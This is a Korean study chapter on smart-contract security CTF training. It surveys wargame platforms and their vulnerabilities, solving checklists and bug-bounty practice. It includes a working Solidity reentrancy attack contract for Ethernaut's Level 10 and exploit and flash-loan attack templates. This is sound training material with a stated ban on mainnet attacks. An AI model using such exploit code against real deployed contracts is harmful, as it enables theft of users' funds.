# Phase 9: CTF 실전 훈련

## 개요

CTF(Capture The Flag)는 스마트 컨트랙트 보안 연구자가 실전 감각을 키우는 가장 효과적인 방법이다. 이론으로 배운 취약점 패턴을 실제 공격 코드로 구현하고, 제한된 시간 안에 문제를 해결하는 훈련은 감사(audit) 실력과 직결된다. 이 챕터는 워게임 플랫폼별 상세 가이드, CTF 대회 참가 전략, 버그바운티 입문까지 실전 보안 연구자 로드맵을 다룬다.

---

## 1. Wargame 플랫폼 (난이도순 상세 가이드)

### 1.1 Ethernaut (OpenZeppelin)

**개요**
OpenZeppelin이 운영하는 온체인 워게임. 브라우저 콘솔 또는 Foundry로 풀 수 있으며, 실제 테스트넷에 배포된 컨트랙트를 공격한다. 스마트 컨트랙트 보안의 ABC를 배우는 데 가장 적합하다. 2024년부터 Hardhat에서 **Foundry로 마이그레이션** 완료.

- URL: https://ethernaut.openzeppelin.com
- 총 문제 수: **41문제** (Level 0~40, 2026년 3월 기준)
- 난이도: 초급~고급
- 언어: Solidity (일부 어셈블리)
- 환경: Sepolia 테스트넷 (+ Arbitrum Sepolia, Optimism Sepolia, Holesky, Amoy 지원)

**핵심 문제별 취약점 요약**

| # | 문제명 | 핵심 취약점 | 난이도 |
|---|--------|------------|--------|
| 0 | Hello Ethernaut | 함수 호출 기초, ABI 이해 | ★☆☆☆☆ |
| 1 | Fallback | receive() / fallback() 함수 오용 | ★☆☆☆☆ |
| 2 | Fal1out | 생성자 오타 (legacy constructor) | ★☆☆☆☆ |
| 3 | Coin Flip | 블록해시 예측 가능성, 온체인 랜덤 불가 | ★★☆☆☆ |
| 4 | Telephone | tx.origin vs msg.sender 혼동 | ★☆☆☆☆ |
| 5 | Token | uint256 언더플로우 (SafeMath 미사용) | ★★☆☆☆ |
| 6 | Delegation | delegatecall 컨텍스트 혼동 | ★★☆☆☆ |
| 7 | Force | selfdestruct를 통한 강제 이더 전송 | ★★☆☆☆ |
| 8 | Vault | 스토리지 슬롯 직접 읽기 (private 변수) | ★★☆☆☆ |
| 9 | King | push 패턴 vs pull 패턴, DoS | ★★☆☆☆ |
| 10 | Re-entrancy | 고전 재진입 공격 | ★★★☆☆ |
| 11 | Elevator | 인터페이스 구현체 조작 | ★★☆☆☆ |
| 12 | Privacy | 패킹된 스토리지 레이아웃 읽기 | ★★★☆☆ |
| 13 | Gatekeeper One | gasleft() 조작, bytes 변환 | ★★★☆☆ |
| 14 | Gatekeeper Two | extcodesize == 0 (생성자 내 실행) | ★★★☆☆ |
| 15 | Naught Coin | ERC20 transferFrom 우회 | ★★☆☆☆ |
| 16 | Preservation | delegatecall 스토리지 충돌 | ★★★☆☆ |
| 17 | Recovery | 컨트랙트 주소 예측 (CREATE) | ★★★☆☆ |
| 18 | MagicNumber | 최소 바이트코드 직접 작성 | ★★★★☆ |
| 19 | Alien Codex | 동적 배열 스토리지 오버플로우 | ★★★★☆ |
| 20 | Denial | 가스 고갈 공격 | ★★★☆☆ |
| 21 | Shop | view 함수 내 상태 의존성 | ★★★☆☆ |
| 22 | Dex | AMM 가격 조작 (소규모) | ★★★☆☆ |
| 23 | Dex Two | 임의 토큰 주소로 Dex 조작 | ★★★☆☆ |
| 24 | Puzzle Wallet | 프록시 스토리지 슬롯 충돌 | ★★★★☆ |
| 25 | Motorbike | UUPS 프록시 초기화 공격 | ★★★★☆ |
| 26 | DoubleEntryPoint | Forta 봇 구현, 이중 진입점 | ★★★★☆ |
| 27 | Good Samaritan | 커스텀 에러 핸들링 오용 | ★★★☆☆ |
| 28 | Gatekeeper Three | 다양한 게이트 조합 | ★★★☆☆ |
| 29 | Switch | calldata 조작으로 함수 선택자 우회 | ★★★★☆ |
| 30 | HigherOrder | calldata 조작, ABI 인코딩 상위 바이트 검증 우회 | ★★★★☆ |
| 31 | Stake | ERC-20 반환값 처리 / 회계 불일치 (WETH transferFrom) | ★★★☆☆ |
| 32 | Impersonator | ECDSA 서명 가변성 / 약한 서명 검증 | ★★★★☆ |
| 33 | Magic Animal Carousel | 비트 패킹 / 스토리지 충돌로 데이터 덮어쓰기 | ★★★☆☆ |
| 34 | Bet House | 예측 가능한 랜덤성 / 오라클 조작 | ★★☆☆☆ |
| 35 | Elliptic Token | 결함 있는 ECDSA 구현, 서명 재사용 | ★★★★☆ |
| 36 | Cashback | **EIP-7702** EOA 위임 남용 (Pectra 업그레이드) | ★★★★☆ |
| 37 | Impersonator Two | 약한/재사용 ECDSA 서명으로 자금 탈취 | ★★★★☆ |
| 38 | UniqueNFT | Proof-of-humanity / 안티봇 우회, EOA vs 컨트랙트 구분 | ★★★☆☆ |
| 39 | Forger | 서명 위조 / ERC-20 민트 패스 재사용 | ★★★☆☆ |
| 40 | NotOptimisticPortal | Optimistic 롤업 포탈 익스플로잇, 머클 패트리샤 트라이 + RLP | ★★★★☆ |

**새 레벨(30-40) 취약점 테마 분류**
- **저수준 EVM**: calldata 조작 (30), 비트 패킹 (33)
- **암호학**: ECDSA 가변성/위조 x4 (32, 35, 37, 39)
- **DeFi/토큰**: ERC-20 회계 버그 (31), 도박 오라클 (34)
- **최신 프로토콜**: EIP-7702 위임 (36), 롤업 포탈 공격 (40), PoH 우회 (38)

**추천 풀이 순서**
1. 0-5번: 기초 개념 정립 (fallback, tx.origin, overflow)
2. 6-12번: 스토리지 구조와 delegatecall 이해
3. 10번 Re-entrancy: 반드시 직접 exploit 코드 작성
4. 13-14번: 저수준 가스/바이트 조작 학습
5. 16, 24, 25번: 프록시 패턴 취약점 집중 학습
6. 18번 MagicNumber: EVM 어셈블리 입문으로 필수
7. 30-33번: calldata 조작, ECDSA, 비트 패킹 심화
8. 35-37번: 암호학 취약점 집중 (ECDSA 시리즈)
9. 36번 Cashback: EIP-7702 최신 프로토콜 학습
10. 40번 NotOptimisticPortal: L2 롤업 보안 학습

**Foundry로 풀기 예시 (Level 10 Re-entrancy)**
```solidity
// test/Reentrance.t.sol
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract AttackReentrance {
    IReentrance target;
    constructor(address _target) { target = IReentrance(_target); }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}
```

---

### 1.2 Damn Vulnerable DeFi (v4)

**개요**
tinchoabbate가 제작한 DeFi 특화 워게임. 실제 DeFi 프로토콜과 유사한 구조(Uniswap V2/V3 포크, Compound 포크 등)를 공격하며, 실전 DeFi 해킹 시나리오를 익힌다. Ethernaut 이후 반드시 거쳐야 할 플랫폼.

- URL: https://www.damnvulnerabledefi.xyz
- 총 문제 수: 18문제
- 난이도: 중급~고급
- 환경: Foundry (v4부터), 로컬 포크

**문제별 핵심 포인트**

| # | 문제명 | 공격 유형 | 핵심 개념 |
|---|--------|----------|----------|
| 1 | Unstoppable | DoS | ERC4626 totalAssets 불일치 |
| 2 | Naive Receiver | 허가 없는 함수 호출 | msg.sender 검증 누락 |
| 3 | Truster | 임의 calldata | flashloan callback 내 approve |
| 4 | Side Entrance | 재진입 유사 패턴 | deposit-in-flashloan |
| 5 | The Rewarder | 플래시론 + 보상 조작 | 스냅샷 타이밍 |
| 6 | Selfie | 거버넌스 공격 | 플래시론으로 투표권 획득 |
| 7 | Compromised | 오라클 조작 | 서버 응답에서 프라이빗키 추출 |
| 8 | Puppet | 오라클 조작 | Uniswap V1 가격 조작 |
| 9 | Puppet V2 | 오라클 조작 | Uniswap V2 TWAP 우회 |
| 10 | Free Rider | 재진입 + 경제적 버그 | NFT 구매 로직 ETH 환급 버그 |
| 11 | Backdoor | 월렛 생성 조작 | Gnosis Safe setup callback |
| 12 | Climber | 거버넌스 + 타임락 | 실행 전 제안 등록 역순 |
| 13 | Wallet Mining | CREATE2 + 프록시 | 주소 예측 + 초기화 경쟁 |
| 14 | Puppet V3 | TWAP 오라클 | Uniswap V3 관측값 조작 |
| 15 | ABI Smuggling | calldata 파싱 버그 | 함수 선택자 + 오프셋 조작 |
| 16 | Shards | ERC1155 + 경제적 버그 | 소수점 반올림 오류 |
| 17 | Curvy Puppet | Curve 오라클 | EMA 가격 조작 |
| 18 | Withdrawal | L2 브리지 | 메시지 검증 우회 |

**문제 12 Climber 상세 풀이 전략**
Climber는 역순 실행 패턴을 이해해야 한다:
1. execute()가 actions를 먼저 실행
2. 실행 완료 후 isOperationReady() 체크
3. 따라서 실행 중에 자신을 PROPOSER로 등록하고
4. 실행할 동작들을 새로운 proposal로 등록하면 사후 검증 통과

---

### 1.3 Capture The Ether

**개요**
스마트 컨트랙트 보안 학습의 클래식. 현재는 업데이트가 중단되었지만 기초 개념 정립에 여전히 유용하다.

- URL: https://capturetheether.com
- 총 문제 수: 20문제
- 카테고리: Warmup, Lotteries, Math, Accounts, Miscellaneous
- 특징: 오래된 Solidity 패턴(0.4.x)의 취약점 포함

**핵심 문제**
- Predict the block hash: 블록해시 256블록 제한
- Token sale: 오버플로우를 통한 가격 조작
- Fuzzy identity: keccak256 해시 조건 충족
- Public key: 트랜잭션에서 공개키 복원

---

### 1.4 EVM Puzzles

**개요**
EVM 바이트코드만으로 이루어진 퍼즐. calldata 또는 msg.value를 조작해 REVERT 없이 실행이 완료되도록 해야 한다. EVM 옵코드를 손으로 추적하는 훈련에 최적.

- URL: https://github.com/fvictorio/evm-puzzles
- 총 문제 수: 10문제 (기본) + 확장판 10문제
- 난이도: EVM 옵코드 지식 필요
- 도구: evm.codes, Foundry debugger

**필수 옵코드 목록**
```
CALLDATALOAD, CALLDATASIZE, CALLDATACOPY
JUMP, JUMPI, JUMPDEST
CALLVALUE, CALLER
ADD, MUL, SUB, DIV, MOD
AND, OR, XOR, NOT
PUSH1~PUSH32
DUP1~DUP16, SWAP1~SWAP16
```

**풀이 접근법**
1. evm.codes의 Playground에 바이트코드 붙여넣기
2. 스택 상태를 단계별로 추적
3. JUMP/JUMPI 조건을 역산해 필요한 calldata/value 계산

---

### 1.5 Paradigm CTF (과거 문제)

**개요**
Paradigm이 주최하는 최고 난이도 CTF. 매년 출제되는 문제들이 아카이브로 공개된다. 현직 감사자들도 쩔쩔매는 문제가 포함된다.

- 아카이브: https://github.com/paradigmxyz/paradigm-ctf-infrastructure
- 참고: https://github.com/minaminao/ctf-blockchain (풀이 모음)
- 주요 주제: EVM 내부, 프록시 취약점, 경제적 공격, ZK 증명 위조, 크로스체인

**2021-2024 대표 문제**
- babysol (2021): EVM 어셈블리 기초
- farmer (2021): 복잡한 DeFi 경제 공격
- lockbox (2022): EVM 저수준 퍼즐
- vanity (2022): CREATE2 + 가스 최적화
- dropper (2023): 스토리지 충돌 + 프록시
- cosmic-radiation (2024): 비트 플립 공격

---

### 1.6 Curta

**개요**
온체인 퍼즐 플랫폼. 문제 자체가 컨트랙트로 배포되어 있으며, 풀이(solve)도 온체인에서 이루어진다. 제한된 인원만 통과 가능한 경쟁 방식.

- URL: https://www.curta.wtf
- 특징: 온체인 증명, NFT 리워드
- 난이도: 고급~전문가

---

### 1.7 Huff Puzzles

**개요**
Huff 언어(EVM 어셈블리 매크로)로 작성된 퍼즐. EVM 최저수준 이해를 요구한다.

- URL: https://github.com/RareSkills/huff-puzzles
- 전제 지식: JUMP, STACK, MEMORY, CALLDATA 옵코드 능숙

---

### 1.8 Mr Steal Yo Crypto

**개요**
실제 DeFi 해킹에서 영감을 받은 문제들. Damn Vulnerable DeFi보다 더 실제 프로토콜에 가까운 코드 기반.

- URL: https://mrstealyocrypto.xyz
- 총 문제 수: 13문제
- 특징: 실제 해킹 패턴 재현

**대표 문제**
- Safu Vault: ERC4626 재진입
- Tasty Staking: 보상 계산 정수 나눗셈
- Governance token: 플래시론 거버넌스 공격

---

### 1.9 DeFiHackLabs

**개요**
실제 발생한 DeFi 해킹을 Foundry PoC로 재현한 저장소. 학습 목적의 최고 자료 중 하나.

- URL: https://github.com/SunWeb3Sec/DeFiHackLabs
- 재현 사고 수: 300건 이상
- 환경: Foundry fork mode (메인넷 포크)

**학습 방법**
```bash
# 특정 블록으로 포크
forge test --match-contract HackTest --fork-url $ETH_RPC --fork-block-number 17000000 -vvv
```

1. 원본 해킹 트랜잭션을 Tenderly/Phalcon에서 분석
2. 공격 흐름을 주석으로 먼저 정리
3. 각 단계를 함수로 구현
4. 실행하여 검증

---

### 1.10 NodeGuardians

**개요**
판타지 RPG 테마의 게이미파이드 스마트 컨트랙트 학습 플랫폼. "가디언"이 되어 퀘스트를 수행하며 XP와 골드를 획득하고, 스킬 트리를 해금하는 방식. Build(구현) 퀘스트와 CTF(공격) 퀘스트를 모두 제공하며, Solidity/Cairo/Noir 3개 트랙을 지원한다. CLI 기반 워크플로우(`ng-questplay`)로 GitHub 연동 제출.

- URL: https://nodeguardians.io
- GitHub: https://github.com/NodeGuardians
- 총 퀘스트 수: **79개 이상** (Solidity 55개 + Cairo 21개 + Noir 3개)
- 난이도: 1~5 (초급~전문가)
- 언어: Solidity, Yul/Assembly, Cairo (StarkNet), Noir (ZK)
- 비용: 무료 (GitHub OAuth 가입)

**퀘스트 유형**

| 유형 | 설명 |
|------|------|
| Build | 테스트를 통과하는 코드를 직접 구현 |
| CTF | 취약점을 찾아 익스플로잇 작성 |

**주요 캠페인 (Solidity/EVM)**

| 캠페인 | 퀘스트 수 | 주요 주제 | 난이도 |
|--------|----------|----------|--------|
| Standalone Quests | 25 | low-level calls, Merkle proofs, 서명, 오라클 공격, 스텔스 주소, 타원곡선, 플래시론 카운터 익스플로잇, 셀프호스팅 EVM, 인터랙티브 사기증명, 상태 채널 등 | 1~5 |
| Understanding Storage | 2 | EVM 스토리지 레이아웃, 패킹 효율 | 2~3 |
| Randomness | 2 | RNG 깨기, Chainlink VRF | 3 |
| Proxy Contracts | 3 | 기본 프록시, 프록시 보안, OpenZeppelin 업그레이드 | 2~4 |
| Diamonds | 3 | 상태 라이브러리, EIP-2535 다이아몬드 프록시 | 3~4 |
| Learning Assembly | 4 | Yul 기초, 비트/바이트, calldata/memory 조작 | 3~4 |
| Gas Optimization | 2 | Solidity 레벨 + 어셈블리 레벨 최적화 | 3~4 |
| **Get Rekt** (rekt.news 협력) | 3 | Cream Finance, Poly Network, Wintermute 실제 해킹 재현 | **4~5** |
| Token Standards | 2 | ERC-20, ERC-721 구현 | 2 |
| Gas Golfing S1 | 4 | 중복 제거, 로마 숫자, 진법 변환 | 3~4 |
| Building on zkSync | 3 | zkSync 컨트랙트, 계정, 페이마스터 | 3 |
| Playing with OP Stack | 2 | 크로스레이어 시크릿, OP 롤업 생성 | 4 |

**주요 캠페인 (Cairo/StarkNet)**

| 캠페인 | 퀘스트 수 | 주요 주제 |
|--------|----------|----------|
| Entering Cairo | 5 | 기초, 타입, 소유권, 구조체, enum |
| Cairo Thinking | 3 | 전투 마법사, 피라미드 퍼즐, 강 레이싱 |
| The Lost Pyramid | 3 | CTF 던전 크롤링 (하/중/상층) |
| Bad Accounts | 3 | 영혼 탈취, 서명 변조, 해싱 우회 |

**주요 캠페인 (Noir/ZK)**

| 캠페인 | 퀘스트 수 | 주요 주제 |
|--------|----------|----------|
| Discovering Noir | 3 | Hello Noir, ZK 던전, 단검과 미끼 |

**게이미피케이션 시스템**
- XP + 골드: 퀘스트 완료 시 획득 (쉬운 퀘스트 ~2,200 XP / 어려운 퀘스트 ~4,200 XP)
- 캐릭터 레벨링 + 스킬 트리로 새 캠페인 해금
- 인벤토리, 저널, 업적 시스템
- Hall of Fame 리더보드

**다른 플랫폼과의 차이점**
- Ethernaut과 달리 **Build(구현) + CTF(공격)** 모두 제공
- Solidity/Cairo/Noir **멀티 언어** 지원 (유일)
- 실제 해킹 재현 (Get Rekt 캠페인, rekt.news 협력)
- L2 커버리지: zkSync, OP Stack, StarkNet, Celestia Blobstream
- CLI + GitHub 연동으로 실제 개발자 워크플로우 반영

---

### 1.11 Remedy CTF (Hexens)

**개요**
Hexens(Web3 보안 기업)이 주최하는 대규모 Web3 CTF. 실제 감사에서 발견된 취약점을 기반으로 문제를 출제하며, Paradigm CTF 인프라 위에서 운영된다. 2025년 1월 첫 공개 대회에서 역대 최대 규모의 Web3 CTF 기록을 세웠다.

- CTF 플랫폼: https://ctf.r.xyz
- 버그바운티 플랫폼: https://r.xyz
- GitHub: https://github.com/Hexens/remedy-ctf-2025
- 주최: Hexens (OtterSec, Decurity 협력)
- 형식: Jeopardy (48시간, 팀 기반)
- 플래그 형식: `rctf{...}`

**Remedy CTF 2025 (첫 공개 대회)**

| 항목 | 내용 |
|------|------|
| 일시 | 2025년 1월 24-26일 (48시간) |
| 참가 | 1,452팀, 2,200명 이상 |
| 상금 | $52,000 (1위 $31,337 / 2위 $13,337 / 3위 $7,337) |
| 기록 | 역대 최대 Web3 CTF (Paradigm CTF 2023 기록 경신) |
| 우승 | 1위 ChainLight, 2위 A-Team, 3위 KimchiPremium |

**문제 목록 (22문제, 점수=난이도)**

| 점수 | 문제명 | 공격 유형 / 설명 |
|------|--------|-----------------|
| 2 | OFAC Executive Order 13337 | 제재/컴플라이언스 우회 |
| 2 | Tokemak | DeFi 유동성 프로토콜 익스플로잇 |
| 3 | Joe's Lending Mirage | 렌딩 프로토콜 취약점 |
| 7 | Peer-to-peer-to-me | P2P 컨트랙트 상호작용 익스플로잇 |
| 8 | Copy/Paste/Deploy | 배포 로직 / CREATE/CREATE2 |
| 8 | World of Memecraft | EVM 메모리/스토리지 조작 |
| 10 | "memorable" onlyOwner | 접근 제어 / 소유권 우회 |
| 11 | Opaze Whisperer | 커스텀 프로토콜 취약점 |
| 11 | Unstable Pool | DeFi 유동성 풀 익스플로잇 |
| 11 | Restricted Proxy | 프록시 패턴 취약점 |
| 14 | HealthCheck as a Service | 서비스 컨트랙트 헬스체크 로직 |
| 15 | risc4 | 저수준 연산 (RISC-V 관련) |
| 16 | Not a very LUCKY TOKEN | 결함 있는 랜덤성 / 토큰 로직 |
| 19 | Et tu, Permit2? | Uniswap Permit2 서명 승인 익스플로잇 |
| 20 | Maybe it's unnecessary? | 불필요한 코드 / 데드코드 익스플로잇 |
| 22 | Proof-of-Thought | ZK 증명 또는 거버넌스 메커니즘 |
| 23 | Lockdown | 타임락 / 락업 컨트랙트 익스플로잇 |
| 26 | Frozen Voting | 거버넌스/투표 시스템 취약점 |
| 30 | Casino Avengers | 리그드 카지노 컨트랙트에서 자금 회수 |
| 30 | Rich Man's Bet | 도박/확률 기반 스마트 컨트랙트 |
| 36 | R vs Q | 암호학 (ECDSA 논스 재사용 등) |
| 39 | **Diamond Heist** (최고 난이도) | UUPS 프록시 + CREATE2 + SELFDESTRUCT + 거버넌스 복합 공격 |

**카테고리**: Solidity/EVM, ZK/Crypto, Web, Reversing

**풀이 자료**
- 공식 챌린지 소스: https://github.com/Hexens/remedy-ctf-2025
- ChainLight 풀이 (전 22문제): https://github.com/theori-io/ctf/tree/master/2025/remedyctf
- The Red Guild 풀이 (Diamond Heist): https://blog.theredguild.org/remedy-ctf-diamond-heist-writeup/
- CTFtime: https://ctftime.org/event/2618/tasks/

**로컬 실행**
```bash
git clone https://github.com/Hexens/remedy-ctf-2025
cd remedy-ctf-2025/<challenge-name>
docker compose up -d
```

---

## 2. CTF 대회 정보

### 2.1 정기 대회

**Secureum RACE**
- 형식: 8문제 객관식, 시간 제한 16분
- 주제: 감사 문제(취약점 식별, 코드 리뷰)
- 주기: 격월 또는 분기별
- 참가: https://ventral.digital (아카이브)
- 특징: 빠른 취약점 식별 능력 훈련에 최적

**Paradigm CTF**
- 형식: Jeopardy + King of the Hill 혼합
- 기간: 48시간
- 팀 규모: 1-5명
- 주기: 연 1회 (주로 8-9월)
- 난이도: 세계 최고 수준

**Blazctf**
- 형식: Jeopardy
- 주기: 연 1회
- 특징: EVM 깊이 있는 문제 다수

**Ethernaut CTF**
- OpenZeppelin 주최
- Ethernaut 스타일 확장 문제

### 2.2 지속 운영 플랫폼 (버그바운티 연계)

**Code4rena**
- 경쟁적 감사 플랫폼
- 기간: 3-14일
- 수익: 중요도에 따른 배분 (High > Medium > Low)
- 참가: https://code4rena.com

**Sherlock**
- 감사 + 커버리지 복합 모델
- Lead Senior Watson 제도
- 분쟁 해결 프로세스 존재

**Immunefi**
- 최대 규모 버그바운티
- 최고 포상: $10M (Wormhole)
- 카테고리: Smart Contract, Blockchain/DLT, Website

**Remedy CTF (Hexens)**
- 형식: Jeopardy, 48시간, 팀 기반
- 주최: Hexens (OtterSec, Decurity 협력)
- 플랫폼: https://ctf.r.xyz
- 2025년 첫 공개 대회: 2,200명+, $52,000 상금, 역대 최대 Web3 CTF
- 카테고리: Solidity/EVM, ZK/Crypto, Web, Reversing
- 실제 감사 발견 기반 문제 출제
- 공식 소스 + 커뮤니티 풀이 공개 (상세 정보는 1.11절 참조)

### 2.3 CTF 일정 추적

유용한 리소스:
- https://ctftime.org (블록체인 카테고리 필터)
- https://twitter.com/TheSecureum
- Paradigm, OpenZeppelin 공식 트위터/X

---

## 3. CTF 풀이 전략 상세

### 3.1 컨트랙트 구조 매핑

문제를 받았을 때 첫 5분:

```
1. 파일 구조 파악
   - 몇 개 파일인가?
   - 상속 관계는?
   - 인터페이스와 라이브러리는?

2. 목표 조건 확인
   - isSolved() 또는 승리 조건 함수 확인
   - 필요한 상태 변화 역산

3. 진입점 식별
   - external/public 함수 목록
   - payable 함수
   - constructor 파라미터
```

**구조 매핑 도구**
```bash
# Foundry로 컨트랙트 스토리지 슬롯 확인
cast storage <contract_address> <slot> --rpc-url $RPC

# 함수 선택자 확인
cast sig "functionName(uint256)"

# 이벤트 확인
cast logs --from-block 0 --to-block latest --address <contract>
```

### 3.2 자금 흐름 추적

DeFi 문제에서 핵심:

```
목표: 컨트랙트의 모든 토큰/ETH를 탈취 또는 특정 조건 달성

추적 순서:
1. constructor에서 초기 자금 배분 확인
2. deposit/withdraw 함수의 회계 로직
3. 플래시론 가능 여부
4. 가격 오라클 의존성
5. 잔액 체크 시점 (before/after callback)
```

**Phalcon으로 실제 트랜잭션 분석**
- https://explorer.phalcon.xyz
- 함수 호출 트리, 자금 흐름, 상태 변화를 시각적으로 확인

### 3.3 불변식 식별 → 깨기

모든 컨트랙트에는 암묵적/명시적 불변식이 있다:

```
명시적 불변식 예:
- require(balance[user] <= totalSupply)
- require(price > 0)
- require(block.timestamp > lastUpdate + delay)

암묵적 불변식 예:
- 누구도 다른 사람의 자금에 접근하지 못한다
- 총 공급량은 감소하지 않는다
- 관리자만 특정 함수를 호출할 수 있다

불변식 깨기 전략:
1. 불변식을 위반할 수 있는 상태 전환 경로 찾기
2. 원자적 트랜잭션으로 실행 가능한지 확인
3. 플래시론으로 큰 자본 없이 가능한지 확인
```

### 3.4 공격 벡터 체크리스트

문제를 받으면 아래 항목을 순서대로 체크:

#### Reentrancy
```
□ ETH 전송 전 상태 업데이트가 이루어지는가?
□ ERC20 transfer 전 상태 업데이트인가?
□ ERC721/ERC1155 safeTransfer 콜백 이용 가능한가?
□ read-only reentrancy 가능한가? (view 함수 내 오라클 조회)
□ cross-function reentrancy인가?
□ cross-contract reentrancy인가?
```

#### Access Control
```
□ onlyOwner/onlyRole 누락된 함수가 있는가?
□ tx.origin을 msg.sender 대신 사용하는가?
□ 초기화 함수(initialize)에 접근 제어가 있는가?
□ 프록시의 관리자 함수가 노출되어 있는가?
□ 다중서명 요건을 우회할 수 있는가?
```

#### Oracle Manipulation
```
□ 현물 가격(spot price)만 사용하는가?
□ 동일 블록 내 가격 조작 후 사용하는가?
□ TWAP 기간이 충분히 긴가?
□ Chainlink heartbeat 확인을 하는가?
□ 오라클이 단일 장애점인가?
```

#### Arithmetic
```
□ Solidity 0.8 이전 버전인가? (overflow 가능)
□ unchecked 블록이 있는가?
□ 정수 나눗셈 반올림 방향이 공격자에게 유리한가?
□ 스케일링 팩터(1e18)가 일관성 있게 적용되는가?
□ 매우 작은/큰 수에서 엣지 케이스가 있는가?
```

#### Signature Replay
```
□ nonce가 있는가?
□ chainId가 서명에 포함되는가?
□ 만료 시간이 있는가?
□ EIP-712 도메인 분리가 올바른가?
□ ecrecover 반환값 0 체크를 하는가?
```

#### Flash Loan
```
□ 거버넌스 투표권을 플래시론으로 획득할 수 있는가?
□ 가격 오라클을 동일 블록에서 조작할 수 있는가?
□ 담보 가치를 일시적으로 증가시킬 수 있는가?
□ 총 공급량 계산에 플래시론 잔액이 포함되는가?
```

### 3.5 Foundry PoC 작성 기법

**표준 PoC 템플릿**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Target.sol";

contract TargetAttack is Test {
    Target target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // 포크 설정 (필요시)
        // vm.createFork(vm.envString("ETH_RPC_URL"), BLOCK_NUMBER);

        // 초기 상태 설정
        target = new Target();
        vm.deal(address(target), 100 ether);
    }

    function testExploit() public {
        console.log("Before attack:");
        console.log("Target balance:", address(target).balance);
        console.log("Attacker balance:", attacker.balance);

        vm.startPrank(attacker);

        // ===== 공격 로직 =====
        AttackContract attack = new AttackContract(address(target));
        attack.execute{value: 1 ether}();
        // ====================

        vm.stopPrank();

        console.log("After attack:");
        console.log("Target balance:", address(target).balance);
        console.log("Attacker balance:", attacker.balance);

        // 승리 조건 검증
        assertEq(address(target).balance, 0);
        assertTrue(target.isSolved());
    }
}

contract AttackContract {
    Target target;

    constructor(address _target) {
        target = Target(_target);
    }

    function execute() external payable {
        // 공격 구현
    }

    receive() external payable {
        // 재진입 콜백 (필요시)
    }
}
```

**플래시론 PoC 템플릿 (Uniswap V3)**
```solidity
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3FlashCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

contract FlashLoanAttack is IUniswapV3FlashCallback {
    IUniswapV3Pool pool;
    address token0;
    address token1;

    constructor(address _pool) {
        pool = IUniswapV3Pool(_pool);
        token0 = pool.token0();
        token1 = pool.token1();
    }

    function attack(uint256 amount0, uint256 amount1) external {
        bytes memory data = abi.encode(msg.sender, amount0, amount1);
        pool.flash(address(this), amount0, amount1, data);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external override {
        (address caller, uint256 amount0, uint256 amount1) =
            abi.decode(data, (address, uint256, uint256));

        // ===== 플래시론 자금으로 공격 =====

        // ===================================

        // 상환
        IERC20(token0).transfer(address(pool), amount0 + fee0);
        IERC20(token1).transfer(address(pool), amount1 + fee1);
    }
}
```

**Forge 실행 및 디버깅 명령**
```bash
# 상세 트레이스 출력
forge test -vvvv --match-test testExploit

# 가스 리포트
forge test --gas-report --match-test testExploit

# 특정 블록에서 포크 테스트
forge test --fork-url $ETH_RPC --fork-block-number 19000000 -vvv

# 디버거 실행
forge debug --debug --match-test testExploit

# 스토리지 덤프
cast storage <address> --rpc-url $RPC
```

---

## 4. 버그바운티 참여 가이드

### 4.1 Immunefi 참여 방법

**플랫폼 개요**
- 총 지급액: $110M+ (2025년 기준)
- 최고 단일 지급: $10M (Wormhole 브리지 취약점)
- 활성 프로그램: 180개 이상
- 연구자 수: 45,000명 이상

**참가 절차**
1. https://immunefi.com 회원가입
2. KYC/AML 완료 (지급 시 필요)
3. 관심 프로젝트 프로그램 규칙 정독
   - 범위(in-scope) 명확히 확인
   - 포상금 표 확인 (Critical/High/Medium/Low)
   - 금지 행위 확인 (DoS 공격 등)
4. 취약점 발견 시 보고서 작성
5. 72시간 내 초기 응답 기다림

**포상금 등급 (일반적)**
```
Critical: $50,000 ~ $10,000,000
High:     $10,000 ~ $100,000
Medium:   $1,000  ~ $10,000
Low:      $100    ~ $1,000
```

**버그 보고서 작성법**

좋은 보고서의 구성:
```markdown
## 취약점 요약
[한 문단으로 취약점과 영향 설명]

## 영향도
- 공격자가 할 수 있는 것
- 영향받는 자금/사용자 규모
- 선제 조건 (초기 자본, 특수 권한 등)

## 취약한 코드
[파일명:줄번호]
[코드 스니펫]

## 공격 시나리오
단계별 설명:
1. 공격자가 X를 한다
2. 컨트랙트가 Y를 실행한다
3. 공격자가 Z를 달성한다

## PoC
[Foundry 테스트 코드]
[실행 명령]
[예상 출력]

## 수정 권고안
[구체적 수정 방법]

## 참고 자료
[관련 취약점, 유사 사례]
```

**주의사항**
- 실제 메인넷 공격 절대 금지
- 공개 전 프로젝트팀에게 먼저 보고 (responsible disclosure)
- 보고 전 다른 연구자에게 유출 금지
- 범위 외 취약점은 프로그램마다 처리 방식 다름

---

### 4.2 Code4rena Warden 되기

**플랫폼 구조**
- 프로젝트가 감사 의뢰 → 경쟁 감사 시작
- Warden(연구자)들이 취약점 제출
- Judge가 중요도 분류
- 포상금 배분 공식 적용

**등록 및 시작**
1. https://code4rena.com 가입
2. Discord 참가
3. 진행 중인 감사 목록 확인
4. 범위(scope) 코드 다운로드 → 분석

**포상금 계산 방식**
```
High 취약점:
  - 동일 취약점 발견자 수에 따라 분할
  - 최초 발견자 가산점

Medium 취약점:
  - 유사 분할

QA 리포트:
  - 별도 풀에서 배분
  - Low, Gas 최적화 포함
```

**효율적인 감사 전략**
```
1일차: 코드베이스 구조 파악
  - 파일 수, 코드 라인 수 확인
  - 주요 컨트랙트 상속 구조
  - 외부 프로토콜 의존성 (Uniswap, Chainlink 등)
  - 테스트 커버리지 확인

2-3일차: 고가치 영역 집중
  - 자금이 직접 관련된 함수
  - 접근 제어 로직
  - 수학적 계산

마지막 날: QA + Gas
  - 남은 Low/Informational 정리
  - Gas 최적화 제안
```

---

### 4.3 Sherlock Lead Senior Watson

**플랫폼 특징**
- 감사 + 커버리지(보험) 복합 모델
- 분쟁 해결 프로세스 존재 (escalation → judge)
- Watson Leaderboard로 실력 증명
